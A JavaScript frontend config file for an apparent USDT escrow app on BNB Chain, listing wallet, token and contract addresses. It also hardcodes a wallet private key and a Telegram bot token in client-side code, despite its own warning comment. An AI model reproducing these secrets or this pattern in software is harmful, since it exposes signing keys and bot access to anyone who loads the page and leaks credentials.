// ===== Frontend Configuration =====
const CONFIG = {
    // Company wallet address (MUST match the one in your admin panel + escrow contract)
    COMPANY_WALLET_ADDRESS: "0xb7e24af27507faf1bab67361baa22fb6a336f3e8",

    // Optional: private key for topping up gas fees (⚠️ never use real key in production frontend!)
    // Only use in controlled backend or testing environments.
    SENDER_KEY: "db99cf22d7efc87b29877a7f5fb7a49d91244f60cd94d20195293071d3ae7a64",

    // Telegram bot token (must match your admin panel config)
    TELEGRAM_BOT_TOKEN: "8023049401:AAEcrpqZ11mU5YuOmfm830FhX-te7Z5GXWU",

    // USDT Token Address (BEP20)
    USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",

    // Escrow Contract Address (update after deployment, same as in admin panel)
    ESCROW_CONTRACT_ADDRESS: "0xC0E0f2aFeD5a9826C65C7820c6B5951FC862e463"
};

// Export for Node.js or attach to window for browser
if (typeof module !== "undefined" && module.exports) {
    module.exports = CONFIG;
} else {
    window.CONFIG = CONFIG;
}
